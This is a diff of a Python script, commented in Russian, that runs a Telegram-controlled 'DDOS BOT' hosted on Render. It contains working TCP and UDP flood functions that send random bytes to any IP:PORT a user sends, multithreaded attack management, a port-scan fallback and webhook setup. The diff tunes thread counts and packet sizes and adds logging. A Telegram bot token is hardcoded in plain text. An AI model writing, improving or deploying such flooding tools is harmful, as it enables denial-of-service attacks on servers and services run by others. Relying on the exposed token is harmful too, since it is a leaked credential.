@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-DDOS BOT - TCP + UDP АТАКИ
-ПРОСТАЯ ВЕРСИЯ ДЛЯ RENDER
+DDOS BOT - TCP + UDP
+ИСПРАВЛЕННАЯ ВЕРСИЯ ДЛЯ RENDER
 """
 
 import telebot
@@ -11,7 +11,8 @@ import random
 import time
 import re
 import os
-from flask import Flask, request
+import sys
+from flask import Flask, request, jsonify
 
 # ============ ТОКЕН ============
 BOT_TOKEN = "8603622469:AAHHcTA6oV4gbcyBTqlRRU7TRY_irCZR5_Q"
@@ -19,33 +20,33 @@ bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
 # ============ НАСТРОЙКИ ============
-THREADS = 100  # Всего потоков (50 TCP + 50 UDP)
+THREADS = 50  # Меньше потоков для стабильности
 active_attacks = {}
+
+print("[*] Бот запускается...", flush=True)
 
 # ============ АТАКИ ============
 def tcp_attack(ip, port, stop_flag):
-    """TCP атака"""
     while not stop_flag.is_set():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(1)
             sock.connect((ip, port))
-            sock.send(random._urandom(1024))
+            sock.send(random._urandom(512))
             sock.close()
         except:
             pass
-        time.sleep(0.001)
+        time.sleep(0.01)
 
 def udp_attack(ip, port, stop_flag):
-    """UDP атака"""
     while not stop_flag.is_set():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.sendto(random._urandom(1024), (ip, port))
+            sock.sendto(random._urandom(512), (ip, port))
             sock.close()
         except:
             pass
-        time.sleep(0.001)
+        time.sleep(0.01)
 
 # ============ МЕНЕДЖЕР ============
 class AttackManager:
@@ -58,16 +59,16 @@ class AttackManager:
     
     def start(self):
         self.start_time = time.time()
+        tcp_count = THREADS // 2
+        udp_count = THREADS // 2
         
-        # TCP потоки (50)
-        for i in range(THREADS // 2):
+        for i in range(tcp_count):
             t = threading.Thread(target=tcp_attack, args=(self.ip, self.port, self.stop_flag))
             t.daemon = True
             self.threads.append(t)
             t.start()
         
-        # UDP потоки (50)
-        for i in range(THREADS // 2):
+        for i in range(udp_count):
             t = threading.Thread(target=udp_attack, args=(self.ip, self.port, self.stop_flag))
             t.daemon = True
             self.threads.append(t)
@@ -137,7 +138,6 @@ def attack_cmd(message):
         return
     
     if not port:
-        bot.reply_to(message, f"🔍 *Сканирую {ip}...*", parse_mode="Markdown")
         port = scan_port(ip)
     
     attack = AttackManager(ip, port)
@@ -157,34 +157,50 @@ def unknown(m):
     bot.reply_to(m, "💀 Отправь IP:PORT\nПример: 43.158.103.205:15455\n\nstop - остановка")
 
 # ============ WEBHOOK ============
-@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
+@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST', 'GET'])
 def webhook():
-    update = telebot.types.Update.de_json(request.stream.read().decode('utf-8'))
-    bot.process_new_updates([update])
-    return 'ok', 200
+    if request.method == 'GET':
+        return 'Webhook is working! Send POST requests.', 200
+    
+    try:
+        update = telebot.types.Update.de_json(request.stream.read().decode('utf-8'))
+        bot.process_new_updates([update])
+        return 'ok', 200
+    except Exception as e:
+        print(f"Webhook error: {e}", flush=True)
+        return 'error', 500
 
-@app.route('/')
+@app.route('/', methods=['GET'])
 def index():
-    return '✅ DDOS BOT RUNNING! Send IP:PORT'
+    return '✅ DDOS BOT IS RUNNING! Send IP:PORT to @' + (bot.get_me().username if hasattr(bot, 'get_me') else 'bot'), 200
+
+@app.route('/health', methods=['GET'])
+def health():
+    return 'OK', 200
 
 # ============ ЗАПУСК ============
 if __name__ == "__main__":
-    print("""
-    ╔════════════════════════════════════════════════════════════════╗
-    ║     DDOS BOT - TCP + UDP                                       ║
-    ║     ПРОСТАЯ ВЕРСИЯ ДЛЯ RENDER                                  ║
-    ╚════════════════════════════════════════════════════════════════╝
-    """)
+    print("=" * 50, flush=True)
+    print("DDOS BOT STARTING...", flush=True)
+    print("=" * 50, flush=True)
     
     # Установка вебхука
     RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://hostingj.onrender.com")
     webhook_url = f"{RENDER_URL}/webhook/{BOT_TOKEN}"
     
+    print(f"[*] Render URL: {RENDER_URL}", flush=True)
+    print(f"[*] Webhook URL: {webhook_url}", flush=True)
+    
     try:
         bot.remove_webhook()
+        print("[*] Webhook removed", flush=True)
         bot.set_webhook(url=webhook_url)
-        print(f"[+] Webhook: {webhook_url}")
+        print(f"[+] Webhook set to {webhook_url}", flush=True)
     except Exception as e:
-        print(f"[!] Ошибка: {e}")
+        print(f"[!] Webhook error: {e}", flush=True)
     
+    port = int(os.environ.get("PORT", 8080))
+    print(f"[*] Starting Flask on port {port}...", flush=True)
     
+    # Запуск Flask без debug (важно для Render)
+    app.run(host="0.0.0.0", port=port, debug=False, threaded=True) 
